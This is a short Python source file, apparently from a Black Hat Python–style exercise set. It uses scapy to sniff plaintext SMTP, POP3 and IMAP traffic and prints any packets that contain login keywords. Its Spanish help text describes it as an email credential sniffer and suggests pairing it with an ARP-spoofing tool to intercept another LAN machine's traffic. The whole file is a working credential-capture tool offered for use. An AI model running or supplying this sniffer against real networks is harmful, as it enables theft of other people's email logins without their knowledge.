import argparse
import sys

from scapy.all import IP, TCP, Raw, sniff

INTERESTING_KEYWORDS = (b"user", b"pass", b"login", b"pwd")


def packet_callback(packet):
    if not (packet.haslayer(TCP) and packet.haslayer(Raw)):
        return

    payload = packet[Raw].load
    if not any(keyword in payload.lower() for keyword in INTERESTING_KEYWORDS):
        return

    src = packet[IP].src if packet.haslayer(IP) else "?"
    dst = packet[IP].dst if packet.haslayer(IP) else "?"
    print(f"[+] {src} -> {dst}:{packet[TCP].dport}")
    print(payload.decode(errors="replace").strip())
    print("-" * 40)


def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "Sniffer de credenciales de correo electronico: intercepta trafico SMTP/POP3/IMAP "
            "en texto plano y muestra los paquetes que contienen palabras clave de login. "
            "Combinalo con bhp-arper para interceptar el trafico de otra maquina de la LAN."
        )
    )
    parser.add_argument("-i", "--iface", default=None, help="Interfaz en la que escuchar (por defecto todas)")
    parser.add_argument(
        "-f", "--filter", default="tcp port 25 or tcp port 110 or tcp port 143",
        help="Filtro BPF a aplicar (por defecto puertos SMTP/POP3/IMAP)",
    )
    parser.add_argument(
        "-c", "--count", type=int, default=0, help="Numero de paquetes a capturar (0 = indefinido, Ctrl-C detiene)"
    )
    return parser.parse_args()


def main():
    args = parse_args()
    print(f"[*] Escuchando credenciales de correo (filtro: {args.filter!r})... Ctrl-C para detener")
    try:
        sniff(iface=args.iface, filter=args.filter, prn=packet_callback, count=args.count, store=False)
    except KeyboardInterrupt:
        print("\n[!] Sniffer detenido.")
    except PermissionError:
        print("[!] Este script necesita privilegios de root para capturar paquetes.", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
